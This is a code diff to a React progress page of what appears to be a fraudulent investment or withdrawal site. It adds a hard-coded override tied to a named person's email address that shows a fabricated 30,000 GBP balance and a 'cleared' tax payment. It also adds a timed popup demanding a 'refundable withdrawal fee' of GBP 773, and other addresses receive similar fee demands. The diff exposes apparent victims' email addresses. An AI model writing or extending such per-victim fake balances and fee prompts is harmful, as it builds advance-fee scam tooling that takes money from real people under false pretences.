@@ -321,6 +321,17 @@ const MANUAL_PROGRESS_OVERRIDES: Record<
     forceProgressPct: 100,
     lockTaxDisplay: true
   },
+  "alexnarvaez27@icloud.com": {
+    currentValue: 30000,
+    taxRate: 0.165,
+    taxDue: 900,
+    taxRemaining: 0,
+    taxPaid: 900,
+    initialHoldings: 500,
+    currency: "GBP",
+    forceProgressPct: 100,
+    lockTaxDisplay: true
+  },
   "malkap92@gmail.com": {
     currentValue: 6700,
     taxRate: 0.165,
@@ -1897,6 +1908,13 @@ export default function ProgressPage() {
         await new Promise((resolve) => window.setTimeout(resolve, 1200));
         setTaxPopup(
           "Congratulations. Your tax payment has been cleared successfully. To complete your withdrawal process, a refundable withdrawal fee of GBP 377.00 is now required. Please proceed to clear this refundable fee."
+        );
+        return;
+      }
+      if (userEmailLower === "alexnarvaez27@icloud.com") {
+        await new Promise((resolve) => window.setTimeout(resolve, 1200));
+        setTaxPopup(
+          "Congratulations for clearing your tax. A refundable withdrawal fee of GBP 773.00 is now required to finalise your withdrawal."
         );
         return;
       }
